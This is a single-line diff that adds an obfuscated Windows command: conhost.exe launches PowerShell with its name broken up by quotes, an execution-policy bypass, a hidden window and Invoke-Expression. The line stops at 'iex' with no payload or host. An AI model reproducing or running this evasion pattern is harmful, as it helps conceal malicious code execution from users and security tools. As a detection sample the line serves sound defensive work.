@@ -1,0 +1,1 @@
+"C:\Windows\System32\conhost.exe" "p"o"w"e"r"sh"ell" -ep bypass -w hidden -c iex 
